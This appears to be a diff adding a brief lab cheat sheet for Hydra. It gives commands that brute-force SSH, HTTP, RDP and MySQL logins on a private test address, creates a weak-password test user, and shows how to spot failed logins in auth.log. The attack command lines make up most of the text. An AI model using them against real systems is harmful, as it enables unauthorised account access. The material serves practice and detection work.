@@ -1,0 +1,19 @@
+**Install hydra**
+sudo apt update
+sudo apt install hydra -y
+sudo apt install wordlists -y
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+  
+hydra -l user -P passwords.txt ssh://192.168.1.10
+hydra -l admin -P passwords.txt http-get://192.168.1.10
+hydra -L users.txt -P passwords.txt rdp://192.168.1.10
+hydra -l root -P passwords.txt mysql://192.168.1.10
+**Parallel Threads**
+hydra -t 4 -l user -P passwords.txt ssh://192.168.1.10
+
+
+sudo useradd testuser
+echo "testuser:Password123" | sudo chpasswd
+
+**detect**
+grep "Failed password" /var/log/auth.log
